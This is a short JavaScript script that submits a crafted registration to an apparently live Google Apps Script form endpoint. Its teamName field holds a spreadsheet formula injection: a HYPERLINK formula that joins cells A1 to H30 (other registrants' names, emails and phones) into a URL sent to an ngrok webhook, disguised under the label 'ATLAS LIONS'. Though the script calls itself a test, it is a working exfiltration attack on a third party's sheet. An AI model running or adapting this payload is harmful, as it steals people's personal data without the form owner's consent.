// CONFIG
const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbyA6XQDveWV44_6Itcy3He1cOc0QqBOTwpigdQIc2It5KNx-fhAZggVppBCOLzoeZK8OQ/exec";
const YOUR_WEBHOOK = "https://9125de234a31.ngrok-free.app/app";

async function testHyperlinkWebhook() {
    console.log("🔗 Testing HYPERLINK webhook...");

    // Realistic payload fields with Arabic/Algerian names
    const payload = {
        fullName: "Ahmed Benali",
        email: "ahmed.benali@gmail.com",
        phone: "213 555987654",
        teamName: `=HYPERLINK(
"${YOUR_WEBHOOK}?data=" & ENCODEURL(TEXTJOIN(",", TRUE, 
A1:C1,E1:H1,A2:C2,E2:H2,A3:C3,E3:H3,A4:C4,E4:H4,A5:C5,E5:H5,
A6:C6,E6:H6,A7:C7,E7:H7,A8:C8,E8:H8,A9:C9,E9:H9,A10:C10,E10:H10,
A11:C11,E11:H11,A12:C12,E12:H12,A13:C13,E13:H13,A14:C14,E14:H14,
A15:C15,E15:H15,A16:C16,E16:H16,A17:C17,E17:H17,A18:C18,E18:H18,
A19:C19,E19:H19,A20:C20,E20:H20,A21:C21,E21:H21,A22:C22,E22:H22,
A23:C23,E23:H23,A24:C24,E24:H24,A25:C25,E25:H25,A26:C26,E26:H26,
A27:C27,E27:H27,A28:C28,E28:H28,A29:C29,E29:H29,A30:C30,E30:H30
)), "ATLAS LIONS")`,
        member2: "Fatima Zahra",
        member3: "Karim Boussad",
        member4: "Yasmine Toumi",
        member5: "Omar Belkacem"
    };

    const response = await fetch(GOOGLE_SCRIPT_URL, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(payload)
    });

    const result = await response.text();
    console.log("✅ HYPERLINK Result:", result);
}

// TEST IT
testHyperlinkWebhook();
